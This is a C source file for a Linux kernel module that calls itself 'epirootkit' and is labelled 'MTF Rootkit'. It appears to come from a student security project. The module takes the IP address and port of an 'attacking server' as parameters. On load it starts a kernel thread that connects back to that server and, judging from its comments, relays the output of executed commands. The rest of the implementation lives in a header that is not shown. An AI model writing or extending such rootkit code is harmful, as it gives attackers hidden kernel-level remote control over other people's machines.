#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>

#include "epirootkit.h"

struct task_struct *network_thread = NULL;
bool thread_exited = false;

char *ip = "127.0.0.1";
int port = 4242;
char *message = "epirootkit: connexion established\n";

module_param(ip, charp, 0644);
module_param(port, int, 0644);
module_param(message, charp, 0644);

MODULE_PARM_DESC(ip, "IPv4 of attacking server");
MODULE_PARM_DESC(port, "Port of attacking server");
MODULE_PARM_DESC(message, "Message to send to the attacking server");

/**
 * @brief Initializes the epirootkit module.
 *
 * @return Returns 0 (SUCCESS) on successful initialization, or a negative
 * error code if the kernel thread fails to start.
 */
static int __init epirootkit_init(void)
{
	pr_info("epirootkit: epirootkit_init: module loaded (/^▽^)/\n");

	// Init structure for exec_code_stds
	// code: return code of the command
	// std_out: output of the command
	// std_err: error output of the command
	if(init_exec_result() != SUCCESS) {
		pr_err("epirootkit: epirootkit_init: memory allocation failed\n");
		return -ENOMEM;
	}

	// Start a kernel thread that will handle network communication
	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
	if (IS_ERR(network_thread)) {
		pr_err("epirootkit: epirootkit_init: failed to start thread\n");
		return PTR_ERR(network_thread);
	}

	return SUCCESS;
}

/**
 * @brief Cleanup function called when the module is unloaded.
 *
 * This function is executed during the module's exit phase. 
 */
static void __exit epirootkit_exit(void)
{
	if (network_thread) {
		if (!thread_exited)
			kthread_stop(network_thread);
		pr_info("epirootkit: close_thread: thread stopped\n");
	}

	close_socket();

	pr_info("epirootkit: epirootkit_exit: module unloaded\n");
}


module_init(epirootkit_init);
module_exit(epirootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("STDBOOL");
MODULE_DESCRIPTION("MTF Rootkit - EPI Rootkit");